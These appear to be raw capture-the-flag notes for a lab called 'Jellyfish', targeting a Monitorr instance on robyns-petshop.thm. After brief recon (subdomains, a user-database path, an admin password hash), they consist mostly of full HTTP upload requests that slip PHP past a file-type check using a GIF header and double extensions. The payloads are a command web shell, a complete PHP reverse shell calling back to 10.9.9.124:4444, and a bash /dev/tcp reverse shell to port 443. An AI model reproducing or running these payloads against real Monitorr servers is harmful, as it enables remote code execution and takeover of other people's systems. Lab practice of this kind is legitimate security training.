## Jellyfish

# Reconn


robyns-petshop.thm
monitorr.robyns-petshop.thm
beta.robyns-petshop.thm
dev.robyns-petshop.thm

## Contact Details
Phone: 01174962854<br>
Email: [staff@robyns-petshop.thm](mailto:staff@robyns-petshop.thm)

/var/www/monitorr/datausers.db

User database dir: /var/www/monitorr/data
User database file: /var/www/monitorr/datausers.db


## Payload

POST /assets/php/upload.php HTTP/1.1
Host: monitorr.robyns-petshop.thm
Cookie: isHuman=1; PHPSESSID=98ke6a48lckc25sb87jmru2el7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: https://monitorr.robyns-petshop.thm
Connection: close
Referer: https://monitorr.robyns-petshop.thm
Content-Length: 274

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name=fileToUpload; filename=she_ll.gif.phtml
Content-Type: image/gif

GIF89a213213123<?php system($_GET["c"]);?>
-----------------------------31046105003900160576454225745--




POST /assets/php/upload.php HTTP/1.1
Host: monitorr.robyns-petshop.thm
Cookie: isHuman=1; PHPSESSID=98ke6a48lckc25sb87jmru2el7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: https://monitorr.robyns-petshop.thm
Connection: close
Referer: https://monitorr.robyns-petshop.thm
Content-Length: 274

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name=fileToUpload; filename=she_ll5.gif.phtml
Content-Type: image/gif

GIF89a213213123<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.9.9.124';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 
-----------------------------31046105003900160576454225745--


admin$2y$10$q1BI3CSqToALH2Q1r2weLeRpyU7QbonizeVxJnPIieo/drbRSzVTa



view-source:https://monitorr.robyns-petshop.thm/assets/data/usrimg/she_ll5.gif.phtml?c=ls%20-al%20/opt/ssh-honeypot

cat /opt/ssh-honeypot/README.md


# FINAL PAYLOAD 

POST /assets/php/upload.php HTTP/1.1
Host: monitorr.robyns-petshop.thm
Cookie: isHuman=1; PHPSESSID=98ke6a48lckc25sb87jmru2el7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: https://monitorr.robyns-petshop.thm
Connection: close
Referer: https://monitorr.robyns-petshop.thm
Content-Length: 320

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name=fileToUpload; filename=reverse.gif.pHp
Content-Type: image/gif

GIF89a213213123


<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.9.124/443 0>&1'");?> 
-----------------------------31046105003900160576454225745--